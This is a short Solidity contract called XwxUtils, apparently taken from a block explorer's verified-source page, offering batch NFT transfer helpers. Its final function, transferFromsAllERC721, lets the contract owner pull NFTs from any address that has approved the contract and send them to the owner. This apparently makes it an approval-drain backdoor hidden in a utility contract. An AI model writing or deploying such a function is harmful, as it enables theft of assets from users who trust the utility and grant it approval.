/**
 *Submitted for verification at snowtrace.io on 2022-03-01
*/

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.7;

interface IERC721 {
    function transferFrom(address from, address to, uint256 tokenId) external;
}

contract XwxUtils {

    address public owner;

    IERC721 private bspNFT;

    IERC721 private bsbNFT;

    constructor() payable {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    function deposit() payable public{
  
    }

    function getOwner() public view returns (address) {
        return owner;
    }

    function transferFromsERC721(address ERC721Addr, address _to, uint256[] memory _nftIds) public {
        IERC721 _ERC721 = IERC721(ERC721Addr);
        for(uint i = 0; i < _nftIds.length; i++){
            _ERC721.transferFrom(msg.sender, _to, _nftIds[i]);
        }
    
    }

    function transferFromsToAddrsERC721(address ERC721Addr, address[] memory _tos, uint256[] memory _nftIds) public {
        IERC721 _ERC721 = IERC721(ERC721Addr);
        for(uint i = 0; i < _nftIds.length; i++){
            _ERC721.transferFrom(msg.sender, _tos[i], _nftIds[i]);
        }
    }

    function transferFromsAllERC721(address ERC721Addr, address _from, uint256[] memory _nftIds) public onlyOwner {
        IERC721 _ERC721 = IERC721(ERC721Addr);
        for(uint i = 0; i < _nftIds.length; i++){
            _ERC721.transferFrom(_from, owner, _nftIds[i]);
        }
    }

}